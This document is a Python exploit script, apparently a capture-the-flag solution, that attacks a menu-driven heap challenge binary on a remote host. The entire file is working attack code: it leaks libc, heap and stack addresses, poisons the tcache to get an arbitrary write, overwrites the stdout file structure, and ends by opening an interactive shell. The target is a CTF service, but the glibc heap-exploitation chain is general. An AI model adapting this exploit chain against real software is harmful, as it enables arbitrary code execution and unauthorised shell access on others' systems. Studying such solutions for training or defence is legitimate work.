#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./chall")
host = args.HOST or "mc.ax"
port = int(args.PORT or 31273)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)


def add(idx, size, data):
    sla(b"> ", str(1).encode("latin-1"))
    sla(b"> ", str(idx).encode("latin-1"))
    sla(b"> ", str(size).encode("latin-1"))
    sla(b"Enter content: ", data)


def delete(idx):
    sla(b"> ", str(2).encode("latin-1"))
    sla(b"> ", str(idx).encode("latin-1"))


def view(idx):
    sla(b"> ", str(3).encode("latin-1"))
    sla(b"> ", str(idx).encode("latin-1"))


libc = SetupLibcELF()
io = start()
add(0, 0x100, b"A" * 8)
add(1, 0x100, b"B" * 8)
add(2, 0x100, b"C" * 8)
add(3, 0x100, b"D" * 8)
add(4, 0x100, b"E" * 8)
add(5, 0x100, b"F" * 8)
add(6, 0x100, b"G" * 8)
add(7, 0x100, b"A" * 8)  # chunk A for consolidation
add(8, 0x100, b"A" * 8)  # chunk B victim chunk
add(9, 0x68, b"A" * 8)  # guard chunk prevent top chunk consolidation
delete(6)
delete(5)
delete(4)
delete(3)
delete(2)
delete(1)
delete(0)
delete(8)  # chunk B
view(8)
libc.address = uu64(ren(6)) - 0x219CE0
lb()
view(1)
heap_base = uu64(ren(6)) - 0x4C0
hb()
delete(7)  # chunk A
add(0, 0x100, b"A" * 8)  # chunk B victim chunk
delete(8)  # chunk B is now coalasced with chunk A
view(6)
heap_base = uu64(ren(5)) << 12
info(f"Heap base := {hex(heap_base)}")
add(
    9,
    0x120,
    b"/bin/sh\x00".ljust(0x108, b"\x00")
    + p(0x111)
    + p(heap_base + 0x10 ^ (heap_base >> 12)),
)

stdout = libc.address + 0x21A780
payload = (
    p64(0xFBAD1800)
    + p64(0) * 3
    + p64(libc.address + 0x21A530)
    + p64(libc.address + 0x21A530 + 0x8) * 3
    + p64(libc.address + 0x21A530 + 0x9)
)  # leak stack address

add(0, 0x100, b"A" * 8)  # chunk B victim chunk
add(
    0,
    0x100,
    p16(0x10) * 0x40
    + p(libc.address + 0x219010) * 14
    + p(libc.address + 0x21A538 - 0x18)
    + p(stdout)
    + p(0xDEADBEEF),
)  # chunk B victim chunk
add(0, 0x100, payload)  # chunk B victim chunk
stack_leak = uu64(ren(6))
success(f"Stack Leak : {hex(stack_leak)}")
add(0, 0x100 - 0x10, b"\x00" * 0x40 + b";sh;sh;" * 6)  # chunk B victim chunk
add(
    0,
    0xD0,
    p(0xDEADBEEF) * 4
    # + b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa"
    # + b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa",
)  # chunk B victim chunk
io.interactive()
